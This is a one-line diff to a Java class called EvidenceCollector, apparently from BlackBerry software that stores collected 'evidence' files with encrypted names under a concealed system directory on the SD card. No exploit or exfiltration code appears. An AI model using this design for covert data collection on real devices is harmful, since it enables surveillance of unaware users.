@@ -230,7 +230,7 @@ public final class EvidenceCollector implements Singleton {
         //#endif
 
         vector.addElement(new Integer(progressive));
-        vector.addElement(basePath + Path.LOG_DIR_BASE); // file:///SDCard/BlackBerry/system/$RIM313/$1
+        vector.addElement(basePath); // file:///SDCard/BlackBerry/system/$RIM313/$1
         vector.addElement(blockDir); // 1
         vector.addElement(encName); // ?
         vector.addElement(fileName); // unencrypted file
